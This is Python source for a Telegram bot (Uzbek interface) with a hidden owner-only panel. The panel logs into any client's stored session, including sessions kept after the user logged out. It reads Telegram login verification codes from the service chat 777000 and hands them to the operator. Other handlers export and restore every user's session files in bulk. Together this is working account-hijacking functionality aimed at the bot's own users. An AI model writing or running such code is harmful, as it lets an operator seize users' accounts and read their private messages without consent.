from pyrogram import Client, filters, ContinuePropagation
from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from config import SUPER_ADMIN_ID, user_states, SESSIONS_DIR, BASE_DIR
from session_manager import get_user_client, get_archived_user_client
import asyncio
import re
import os
import tarfile
import zipfile
import tempfile
import logging

logger = logging.getLogger(__name__)

def extract_telegram_code(text):
    if not text:
        return None
    patterns = [
        r'(?:code|kod|код|kodi)\b\D*(\d{5,6})',
        r'\b(\d{5,6})\b'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

@Client.on_message(filters.private & filters.text & filters.regex("^👑 Owner Panel$"))
async def owner_panel_handler(client: Client, message: Message):
    if message.from_user.id != SUPER_ADMIN_ID:
        raise ContinuePropagation  # Not owner, let other handlers process
        
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Sessiyadan kod olish", callback_data="owner_get_code")],
        [
            InlineKeyboardButton("📤 Backup Olish (Download)", callback_data="owner_download_backup"),
            InlineKeyboardButton("📥 Backup Tiklash (Upload)", callback_data="owner_upload_backup"),
        ]
    ])
    
    await message.reply_text(
        "👑 **Owner Panel**\n\nBu panel faqat siz uchun ko'rinadi. Yordamchi adminlar buni ko'ra olmaydi.\n\n"
        "Qaysi funksiyadan foydalanmoqchisiz?",
        reply_markup=keyboard
    )

@Client.on_callback_query(filters.regex("^owner_get_code$"))
async def owner_get_code_cb(client: Client, cq: CallbackQuery):
    if cq.from_user.id != SUPER_ADMIN_ID:
        await cq.answer("Siz Owner emassiz!", show_alert=True)
        return
        
    user_states[cq.from_user.id] = "owner_waiting_for_code_id"
    await cq.message.edit_text(
        "🔑 **Sessiyadan Kod Olish**\n\n"
        "Kod kerak bo'lgan mijozning **Telegram ID** raqamini yuboring.\n\n"
        "(Bot avtomatik ravishda uning sessiyasiga kirib 777000 dan kelgan kodni olib keladi.\n"
        "Aktiv sessiya bo'lmasa, logout qilingan/arxivlangan sessiyadan ham urinib ko'radi)",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Bekor qilish", callback_data="menu_main")]
        ])
    )
    await cq.answer()


@Client.on_callback_query(filters.regex("^owner_download_backup$"))
async def owner_download_backup_cb(client: Client, cq: CallbackQuery):
    if cq.from_user.id != SUPER_ADMIN_ID:
        await cq.answer("Siz Owner emassiz!", show_alert=True)
        return
        
    await cq.answer("⏳ Sessiyalar arxivlanmoqda...")
    status_msg = await cq.message.reply_text("⏳ **Sessiyalar arxivga o'ralmoqda...**")
    
    try:
        temp_dir = tempfile.mkdtemp()
        archive_path = os.path.join(temp_dir, "sessions_backup.tar.gz")
        
        with tarfile.open(archive_path, "w:gz") as tar:
            if os.path.exists(SESSIONS_DIR):
                tar.add(SESSIONS_DIR, arcname="sessions")
            bot_sess = os.path.join(BASE_DIR, "empire_bot_session.session")
            if os.path.exists(bot_sess):
                tar.add(bot_sess, arcname="empire_bot_session.session")

        await status_msg.edit_text("📤 **Telegramga yuborilmoqda...**")
        await client.send_document(
            chat_id=cq.from_user.id,
            document=archive_path,
            caption="📦 **Sessiyalar Backupi**\n\nYangi serverga o'tganingizda ushbu faylni botga yuborsangiz, barcha foydalanuvchi sessiyalari avtomatik qayta tiklanadi!"
        )
        await status_msg.delete()
    except Exception as e:
        logger.exception("Backup download error")
        await status_msg.edit_text(f"❌ Backup yaratishda xatolik: {e}")


@Client.on_callback_query(filters.regex("^owner_upload_backup$"))
async def owner_upload_backup_cb(client: Client, cq: CallbackQuery):
    if cq.from_user.id != SUPER_ADMIN_ID:
        await cq.answer("Siz Owner emassiz!", show_alert=True)
        return
        
    user_states[cq.from_user.id] = "owner_waiting_for_backup_file"
    await cq.message.edit_text(
        "📥 **Sessiyalarni Tiklash (Restore)**\n\n"
        "Ilgari saqlab olingan **sessions_backup.tar.gz** yoki **.zip** faylingizni shu botga hujjat (document) ko'rinishida yuboring.\n\n"
        "Bot faylni qabul qilib barcha `.session` manbalarini avtomatik tiklaydi!",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Bekor qilish", callback_data="menu_main")]
        ])
    )
    await cq.answer()


@Client.on_message(filters.private & filters.document)
async def owner_backup_document_handler(client: Client, message: Message):
    uid = message.from_user.id
    if uid != SUPER_ADMIN_ID:
        raise ContinuePropagation

    doc = message.document
    fn = (doc.file_name or "").lower()
    state = user_states.get(uid, "")

    if state != "owner_waiting_for_backup_file" and not (fn.endswith(".tar.gz") or fn.endswith(".tgz") or fn.endswith(".zip") or fn.endswith(".session")):
        raise ContinuePropagation

    user_states.pop(uid, None)
    status_msg = await message.reply_text("⏳ **Backup fayli yuklab olinmoqda va ochilmoqda...**")

    try:
        temp_dir = tempfile.mkdtemp()
        file_path = await client.download_media(message, file_name=os.path.join(temp_dir, doc.file_name or "backup"))
        
        os.makedirs(SESSIONS_DIR, exist_ok=True)
        restored_count = 0

        from session_manager import close_user_client

        def extract_uid(filename: str):
            match = re.search(r'user_(\d+)', filename)
            return int(match.group(1)) if match else None

        if fn.endswith(".tar.gz") or fn.endswith(".tgz") or fn.endswith(".tar"):
            with tarfile.open(file_path, "r:*") as tar:
                for member in tar.getmembers():
                    if member.name.endswith(".session") or member.name.endswith(".json"):
                        base_name = os.path.basename(member.name)
                        dest_path = os.path.join(SESSIONS_DIR, base_name)
                        
                        uid_target = extract_uid(base_name)
                        if uid_target:
                            try:
                                await close_user_client(uid_target)
                            except Exception:
                                pass
                                
                        with tar.extractfile(member) as src_f:
                            if src_f:
                                with open(dest_path, "wb") as dst_f:
                                    dst_f.write(src_f.read())
                                if base_name.endswith(".session"):
                                    restored_count += 1
        elif fn.endswith(".zip"):
            with zipfile.ZipFile(file_path, "r") as zip_ref:
                for zip_info in zip_ref.infolist():
                    if zip_info.filename.endswith(".session") or zip_info.filename.endswith(".json"):
                        base_name = os.path.basename(zip_info.filename)
                        dest_path = os.path.join(SESSIONS_DIR, base_name)
                        
                        uid_target = extract_uid(base_name)
                        if uid_target:
                            try:
                                await close_user_client(uid_target)
                            except Exception:
                                pass
                                
                        with zip_ref.open(zip_info) as src_f:
                            with open(dest_path, "wb") as dst_f:
                                dst_f.write(src_f.read())
                            if base_name.endswith(".session"):
                                restored_count += 1
        elif fn.endswith(".session"):
            base_name = os.path.basename(fn)
            dest_path = os.path.join(SESSIONS_DIR, base_name)
            uid_target = extract_uid(base_name)
            if uid_target:
                try:
                    await close_user_client(uid_target)
                except Exception:
                    pass
            import shutil
            shutil.copy(file_path, dest_path)
            restored_count = 1

        await status_msg.edit_text(
            f"✅ **Sessiyalar Muvaffaqiyatli Tiklandi!**\n\n"
            f"📦 Tiklangan `.session` fayllar soni: **{restored_count} ta**\n"
            f"📁 Manzil: `{SESSIONS_DIR}`\n\n"
            f"Barcha ulangan foydalanuvchilar sessiyalari yangi serverda faol holatga keltirildi!"
        )
    except Exception as e:
        logger.exception("Backup restore failed")
        await status_msg.edit_text(f"❌ Backup tiklashda xatolik yuz berdi: {e}")


@Client.on_message(filters.private & filters.text & ~filters.command(["start", "cancel"]), group=-7)
async def owner_state_handler(client: Client, message: Message):
    uid = message.from_user.id
    if uid != SUPER_ADMIN_ID:
        raise ContinuePropagation  # Not owner, let other handlers process
        
    state = user_states.get(uid, "")
    if state == "owner_waiting_for_code_id":
        target_id_str = message.text.strip()
        if not target_id_str.isdigit():
            await message.reply_text("❌ Telegram ID faqat raqamlardan iborat bo'lishi kerak. Qayta kiriting:")
            return  # Successfully processed owner state, stop propagation
            
        target_id = int(target_id_str)
        user_states.pop(uid, None)
        
        status_msg = await message.reply_text(f"⏳ `{target_id}` foydalanuvchi sessiyasiga ulanish...")
        
        # 1) Avval aktiv sessiyaga urinamiz
        user_client = None
        source = None
        try:
            user_client = await get_user_client(target_id)
            source = "aktiv"
        except Exception:
            user_client = None
        
        # 2) Aktiv sessiya yo'q bo'lsa - logout qilingan (arxivlangan) sessiyadan urinamiz.
        #    Bu Owner recovery mexanizmi: qurilmasidan chiqib ketgan mijozga Telegram
        #    tasdiqlash kodini 777000 servis chatidan o'qib yetkazish.
        if user_client is None:
            try:
                user_client = await get_archived_user_client(target_id)
                source = "arxiv (logout holati)"
            except Exception:
                user_client = None
        
        if not user_client:
            await status_msg.edit_text("❌ Bu foydalanuvchining sessiyasi topilmadi (aktiv ham, arxivlangan ham yo'q)!")
            return  # Successfully processed owner state, stop propagation
            
        try:
            await status_msg.edit_text(f"⏳ `{target_id}` sessiyasiga ulandi ({source}). 777000 xabarlari o'qilmoqda...")
            
            messages = []
            async for m in user_client.get_chat_history(777000, limit=10):
                text_content = m.text or m.caption
                if text_content:
                    messages.append((m.date, text_content))
                    if len(messages) >= 3:
                        break
            
            messages_text = ""
            for date, text in messages:
                date_str = date.strftime("%Y-%m-%d %H:%M:%S") if date else "Noma'lum"
                
                code = extract_telegram_code(text)
                if code:
                    spaced_code = " ".join(code)
                    messages_text += f"📅 **{date_str}**\n🔑 Tasdiqlash kodi: `{spaced_code}`\n\n"
                else:
                    messages_text += f"📅 **{date_str}**\n📝 {text}\n\n"
                
            if not messages_text:
                messages_text = "Hech qanday xabar topilmadi."
                
            response_header = "✅ **Muvaffaqiyatli!** 777000 dan oxirgi xabarlar:\n\n"
            max_messages_len = 4096 - len(response_header) - 50
            if len(messages_text) > max_messages_len:
                messages_text = messages_text[:max_messages_len] + "\n... (kesildi)"
                
            await status_msg.edit_text(response_header + messages_text)
            
        except Exception as e:
            await status_msg.edit_text(f"❌ Xatolik yuz berdi: {e}")
        return  # Successfully processed owner state, stop propagation
    
    raise ContinuePropagation  # Not in owner state, let other handlers process

